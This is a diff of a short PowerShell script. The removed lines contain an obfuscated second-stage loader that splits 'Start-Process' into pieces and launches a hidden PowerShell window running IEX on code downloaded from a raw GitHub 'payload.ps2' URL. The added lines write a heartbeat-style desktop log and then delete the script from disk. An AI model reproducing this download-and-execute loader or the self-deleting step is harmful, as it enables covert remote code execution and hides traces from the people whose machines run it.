@@ -1,14 +1,9 @@
-$u = "https://raw.githubusercontent.com/YZUs1121518/WATmidle/refs/heads/main/payload.ps2"
-$a = "Start-"; $b = "Process"
-$u = "https://raw.githubusercontent.com/YZUs1121518/WATmidle/refs/heads/main/payload.ps2"
-if ($Args[0] -ne "SecondStage") {
-    & "$a$b" powershell.exe -ArgumentList "-NoP -W Hidden -Command IEX (New-Object Net.WebClient).DownloadString('$u') SecondStage"
-    exit
-}
+$log = "$env:USERPROFILE\Desktop\disk_active.txt"
+"File-based execution started at $(Get-Date)" | Out-File -FilePath $log -Force
 
-$path = "$env:USERPROFILE\Desktop\hidden_active.txt"
-"Session started at $(Get-Date)" | Out-File -FilePath $path -Force
 for ($i=1; $i -le 10; $i++) {
-    "Heartbeat $i at $(Get-Date)" | Out-File -FilePath $path -Append
+    "Disk-log $i at $(Get-Date)" | Out-File -FilePath $log -Append
     Start-Sleep -Seconds 5
 }
+
+Remove-Item $MyInvocation.MyCommand.Definition
